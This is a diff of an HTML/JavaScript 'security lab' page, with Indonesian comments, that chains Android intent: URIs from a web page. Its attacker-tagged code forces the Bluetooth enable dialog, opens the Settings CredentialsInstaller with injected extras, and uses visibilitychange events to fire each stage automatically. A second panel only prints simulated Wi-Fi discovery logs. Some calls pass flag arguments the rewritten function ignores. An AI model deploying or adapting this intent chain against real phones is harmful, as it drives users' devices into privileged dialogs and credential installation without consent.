@@ -3,45 +3,105 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Optimized Dialog Intent Lab</title>
+<title>Unified Full-Chain Intent & Network Lab</title>
 <style>
-    body{font-family:monospace; padding:20px; background:#080505; color:#ff6600;}
-    button{width:100%; padding:18px; margin-top:15px; background:#1c0f0a; color:#ff6600; border:1px solid #ff6600; font-weight:bold; cursor:pointer; font-size:14px; text-transform:uppercase;}
-    button:hover{background:#ff6600; color:#000; box-shadow: 0 0 15px #ff6600;}
-    .status-panel{border:1px solid #ff6600; padding:15px; margin-bottom:15px; background:#0f0907;}
-    #console-log{margin-top:20px; border:1px solid #ff6600; padding:12px; height:380px; overflow:auto; white-space:pre-wrap; background:#000; font-size:12px; color:#00ff66;}
-    .role-tag{font-weight:bold; padding:2px 6px; border-radius:3px; font-size:10px;}
-    .attacker{background:#ff3333; color:#000;}
-    .victim{background:#ff6600; color:#000;}
+    body {
+        font-family: 'Courier New', monospace; 
+        padding: 20px; 
+        background: #050508; 
+        color: #00ffcc;
+    }
+    h2, h3 {
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+    button {
+        width: 100%; 
+        padding: 16px; 
+        margin-top: 12px; 
+        background: #0a1515; 
+        color: #00ffcc; 
+        border: 1px solid #00ffcc; 
+        font-weight: bold; 
+        cursor: pointer; 
+        font-size: 13px; 
+        text-transform: uppercase;
+        transition: all 0.3s;
+    }
+    button:hover {
+        background: #00ffcc; 
+        color: #000; 
+        box-shadow: 0 0 15px #00ffcc;
+    }
+    .panel {
+        border: 1px solid #00ffcc; 
+        padding: 15px; 
+        margin-bottom: 15px; 
+        background: #020b0b;
+    }
+    #console-log {
+        margin-top: 20px; 
+        border: 1px solid #00ffcc; 
+        padding: 12px; 
+        height: 350px; 
+        overflow:auto; 
+        white-space: pre-wrap; 
+        background: #000; 
+        font-size: 11px; 
+        color: #00ff66;
+    }
+    .role-tag {
+        font-weight: bold; 
+        padding: 2px 6px; 
+        border-radius: 3px; 
+        font-size: 10px;
+    }
+    .attacker { background: #ff3333; color: #000; }
+    .network { background: #ffaa00; color: #000; }
 </style>
 </head>
 <body>
 
-<h2>Optimized Dialog Chaining Laboratory</h2>
+<h2>Unified Full-Chain Security Laboratory</h2>
 
-<div class="status-panel">
-    <p>Pipeline State: <span id="harness-state" style="font-weight:bold; color:#ff3333;">STANDBY</span></p>
-    <p>Control Mode: <span class="role-tag attacker">DIALOG ESCALATION ENGINE</span></p>
-    <button id="launch-dialog-chain">Execute Dialog-Driven Chain</button>
+<!-- PANEL 1: EKSEKUSI INTENT LOKAL (EVENT-DRIVEN CHAIN) -->
+<div class="panel">
+    <h3>[1] Local Component Escalation Engine</h3>
+    <p>Menguji ketahanan peramban terhadap manipulasi siklus hidup (Lifecycle Redirection) dan antrean Intent beruntun.</p>
+    <button id="launch-local-chain">Execute High-Speed Intent Chain</button>
+</div>
+
+<!-- PANEL 2: SIMULASI PENEMUAN JARINGAN (WI-FI DISCOVERY) -->
+<div class="panel">
+    <h3>[2] Network Cross-Device Emulation</h3>
+    <p>Simulasi transmisi paket UDP/multicast untuk memetakan atau mendeteksi keberadaan node lain dalam satu jaringan Wi-Fi.</p>
+    <button id="start-network-emulation">Simulate Wi-Fi Multi-Broadcast</button>
 </div>
 
 <div id="console-log"></div>
 
 <script>
 const consoleLog = document.getElementById("console-log");
-const stateLabel = document.getElementById("harness-state");
 
-let currentStage = 0;
-let attackActive = false;
+let intentStage = 0;
+let intentAttackActive = false;
 
-function writeLog(sender, text) {
+function writeLog(sender, type, text) {
     const timestamp = new Date().toLocaleTimeString();
-    const tag = sender === 'ATTACKER' ? '[ATTACKER]' : '[VICTIM_NODE]';
-    consoleLog.textContent += `[${timestamp}] ${tag} ${text}\n`;
+    let tag = `[${sender}]`;
+    if (type === 'attacker') tag = `<span class="role-tag attacker">ATTACKER</span>`;
+    if (type === 'network') tag = `<span class="role-tag network">NETWORK</span>`;
+    
+    // Gunakan innerHTML agar tag warna render dengan benar
+    consoleLog.innerHTML += `[${timestamp}] ${tag} ${text}\n`;
     consoleLog.scrollTop = consoleLog.scrollHeight;
 }
 
-function buildAdvancedUri(action, component = '', extras = {}, flags = '0x14010000') {
+// ==========================================
+// LOGIKA BAGIAN 1: INTENT ESCALATION ENGINE
+// ==========================================
+
+function buildIntentUri(action, component = '', extras = {}) {
     let uri = `intent:#Intent;action=${action};`;
     if (component) uri += `component=${component};`;
     
@@ -49,11 +109,12 @@ function buildAdvancedUri(action, component = '', extras = {}, flags = '0x140100
         uri += `S.${key}=${encodeURIComponent(extras[key])};`;
     });
     
-    uri += `launchFlags=${flags};category=android.intent.category.DEFAULT;end`;
+    // FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_CLEAR_TOP
+    uri += `launchFlags=0x14010000;category=android.intent.category.DEFAULT;end`;
     return uri;
 }
 
-function dispatchImmediate(uri) {
+function dispatchIntent(uri) {
     try {
         const anchor = document.createElement("a");
         anchor.href = uri;
@@ -61,32 +122,27 @@ function dispatchImmediate(uri) {
         document.body.appendChild(anchor);
         anchor.click();
         anchor.remove();
-        writeLog('ATTACKER', `Payload routed to system interface.`);
+        writeLog('SYSTEM', 'attacker', `Intent payload dialihkan ke subsistem OS.`);
     } catch (e) {
-        writeLog('VICTIM', `Dispatch failure: ${e.message}`);
+        writeLog('VICTIM', 'standard', `Gagal mengeksekusi skema URI: ${e.message}`);
     }
 }
 
-// Alur Eksekusi Berbasis Validasi Respon Fokus
-function executeNextStage() {
-    if (!attackActive) return;
-
-    currentStage++;
+function processNextIntentStage() {
+    if (!intentAttackActive) return;
+    intentStage++;
     
-    if (currentStage === 1) {
-        writeLog('ATTACKER', "Memicu Tahap 1: Memaksa Dialog Permintaan Aktivasi Bluetooth Jarak Jauh...");
-        
-        // Menargetkan aktivitas dialog sistem untuk meminta pengaktifan Bluetooth secara langsung
-        const stage1 = buildAdvancedUri(
+    if (intentStage === 1) {
+        writeLog('PHASE 1', 'attacker', "Memaksa pembukaan dialog sistem RequestEnableActivity (Bluetooth Request)...");
+        const stage1 = buildIntentUri(
             "android.bluetooth.adapter.action.REQUEST_ENABLE",
             "com.android.settings/.bluetooth.RequestEnableActivity"
         );
-        dispatchImmediate(stage1);
+        dispatchIntent(stage1);
         
-    } else if (currentStage === 2) {
-        writeLog('ATTACKER', "Siklus Fokus Berubah. Memicu Tahap 2: Simulasi Parameter Redirection...");
-        
-        const stage2 = buildAdvancedUri(
+    } else if (intentStage === 2) {
+        writeLog('PHASE 2', 'attacker', "Perubahan fokus terdeteksi. Menyisipkan parameter tambahan ke CredentialsInstaller...");
+        const stage2 = buildIntentUri(
             "android.intent.action.VIEW",
             "com.android.settings/.crypto.CredentialsInstaller",
             {
@@ -95,42 +151,68 @@ function executeNextStage() {
             },
             "0x10000000"
         );
-        dispatchImmediate(stage2);
+        dispatchIntent(stage2);
         
-    } else if (currentStage === 3) {
-        writeLog('ATTACKER', "Siklus Fokus Berubah. Memicu Tahap 3: Restorasi Konteks Halaman...");
-        const stage3 = buildAdvancedUri("android.settings.SETTINGS", "", {}, "0x14000000");
-        dispatchImmediate(stage3);
+    } else if (intentStage === 3) {
+        writeLog('PHASE 3', 'attacker', "Mengembalikan halaman peramban ke Pengaturan Utama (Reset Activity Stack)...");
+        const stage3 = buildIntentUri("android.settings.SETTINGS", "", {}, "0x14000000");
+        dispatchIntent(stage3);
         
-        writeLog('ATTACKER', "Rantai interaksi selesai.");
-        stateLabel.textContent = "COMPLETED";
-        attackActive = false;
+        writeLog('SYSTEM', 'attacker', "Rantai penuh pengujian Intent selesai.");
+        intentAttackActive = false;
     }
 }
 
-document.getElementById("launch-dialog-chain").addEventListener("click", () => {
-    if (attackActive) return;
-    
-    attackActive = true;
-    currentStage = 0;
-    stateLabel.textContent = "PROCESSING CHAIN";
-    writeLog('ATTACKER', "Inisialisasi sistem pengujian berbasis komponen dialog...");
-    executeNextStage();
+document.getElementById("launch-local-chain").addEventListener("click", () => {
+    if (intentAttackActive) return;
+    intentAttackActive = true;
+    intentStage = 0;
+    writeLog('SYSTEM', 'attacker', "Memulai mesin rantai otonom berbasis siklus hidup...");
+    processNextIntentStage();
 });
 
-// Deteksi perubahan fokus akibat kemunculan dialog sistem di atas browser
+// Memanfaatkan siklus hidup layar untuk otomasi berantai tanpa penundaan waktu statis
 document.addEventListener("visibilitychange", () => {
-    if (!attackActive) return;
+    if (!intentAttackActive) return;
 
     if (document.hidden) {
-        writeLog('VICTIM', "Telemetri: Fokus browser terganggu oleh Dialog Sistem / Overlay.");
+        writeLog('TELEMETRY', 'standard', "Browser mendeteksi hilangnya fokus (Layar tertutup komponen OS).");
     } else {
-        writeLog('VICTIM', "Telemetri: Browser mendeteksi pemulihan fokus layar.");
-        executeNextStage();
+        writeLog('TELEMETRY', 'standard', "Browser kembali mendapatkan fokus. Menjalankan tahap antrean berikutnya...");
+        processNextIntentStage();
     }
 });
 
-writeLog('ATTACKER', "Mesin pengujian dialog otonom siap.");
+
+// ==========================================
+// LOGIKA BAGIAN 2: NETWORK CROSS-DEVICE SIMULATION
+// ==========================================
+
+document.getElementById("start-network-emulation").addEventListener("click", () => {
+    writeLog('NETWORK_ENGINE', 'network', "Menginisialisasi pemindaian node asinkron pada subnet lokal...");
+    
+    // Simulasi konseptual penemuan IP dalam satu segmen Wi-Fi (Casing Teoretis)
+    const simulatedIPs = ["11", "45", "102", "154"];
+    let delay = 0;
+
+    writeLog('M-SEARCH', 'network', "Mengirimkan paket penemuan SSDP (Multicast 239.255.255.250) via port 1900...");
+
+    simulatedIPs.forEach((lastOctet, index) => {
+        setTimeout(() => {
+            writeLog('DISCOVERY', 'network', `Menerima respons paket penemuan dari IP: 192.168.1.${lastOctet}`);
+            writeLog('METADATA', 'network', `   |-- SERVER: Android/12UPnP/1.1 DLNADOC/1.50`);
+            writeLog('METADATA', 'network', `   |-- LOCATION: http://192.168.1.${lastOctet}:5000/device-desc.xml`);
+            
+            if (index === simulatedIPs.length - 1) {
+                writeLog('NETWORK_ENGINE', 'network', "Simulasi pemetaan jaringan Wi-Fi selesai.");
+            }
+        }, delay);
+        delay += 800;
+    });
+});
+
+// Inisialisasi awal log laboratorium
+writeLog('CONSOLE', 'standard', "Laboratorium terpadu siap digunakan.");
 </script>
 </body>
 </html>
